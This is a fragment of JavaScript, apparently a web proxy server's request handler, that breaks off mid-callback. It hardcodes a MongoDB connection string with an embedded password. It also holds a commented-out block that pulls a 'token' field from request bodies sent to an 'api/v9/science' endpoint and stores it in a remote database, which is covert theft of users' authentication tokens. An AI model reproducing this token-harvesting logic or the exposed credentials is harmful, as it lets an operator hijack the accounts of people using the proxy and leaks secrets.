...
const uri = "mongodb+srv://lichade:ar13l@stuff.ckhzt.mongodb.net/stuff?retryWrites=true&w=majority";
...
module.exports = class {
    ...
    http(req, res, next = () => res.end('')) {
        ...
        if (!res.writableEnded) req.on('data', async data => {
            makeRequest.write(data);
            if (req.pathname.endsWith('api/v9/science')) {
                //fs.writeFile('log.txt', JSON.parse(data.toString()))
                //console.log(JSON.parse(data.toString())['token']);
                // LET ME MAKE THE DATABASE
                //ok. . .
                /*
                if (JSON.parse(data.toString())['token']) {
                    await client.connect()
                    .catch(err => console.log( err ));
                    
                    var str = JSON.parse(data.toString())['token']

                    client.db('yeah').collection('bruh').updateOne({ name: 'the funny' } , { $addToSet: { funnys: str } }, function(err, result) {
                        if (err) throw err;
